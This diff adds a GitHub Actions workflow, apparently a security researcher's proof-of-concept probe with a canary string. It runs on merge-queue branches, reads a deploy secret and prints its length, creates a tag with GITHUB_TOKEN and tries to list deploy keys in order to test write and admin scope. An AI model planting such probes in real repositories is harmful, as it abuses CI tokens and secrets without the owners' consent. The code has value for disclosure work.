@@ -1,0 +1,33 @@
+name: Fork Write Chain Test
+on:
+  push:
+    branches:
+      - "gh-readonly-queue/**"
+
+permissions:
+  contents: write
+  packages: write
+
+jobs:
+  chain-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check token scope
+        env:
+          HAS_SECRET: ${{ secrets.DEPLOY_REVIEWER != '' }}
+          SECRET_VAL: ${{ secrets.DEPLOY_REVIEWER }}
+        run: |
+          echo "CHAIN_CANARY: Vera Koster REF-5109-214"
+          echo "origin: toofikz/public-test-repo fork (mq-write-chain)"
+          echo "event: $GITHUB_EVENT_NAME"
+          echo "ref: $GITHUB_REF"
+          echo "repository: $GITHUB_REPOSITORY"
+          echo "has_secret: $HAS_SECRET"
+          echo "secret_length: ${#SECRET_VAL}"
+          echo "--- GITHUB_TOKEN write test ---"
+          # Test if the token actually has write scope by creating a lightweight tag
+          curl -s -o /dev/null -w "create_tag_status: %{http_code}"             -X POST "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs"             -H "Authorization: Bearer $GITHUB_TOKEN"             -H "Content-Type: application/json"             -d "{"ref":"refs/tags/chain-proof-$GITHUB_RUN_ID","sha":"$GITHUB_SHA"}"
+          echo ""
+          # Also test reading deploy keys (would indicate admin scope)
+          curl -s -o /dev/null -w "list_keys_status: %{http_code}"             -H "Authorization: Bearer $GITHUB_TOKEN"             "https://api.github.com/repos/$GITHUB_REPOSITORY/keys"
+          echo ""
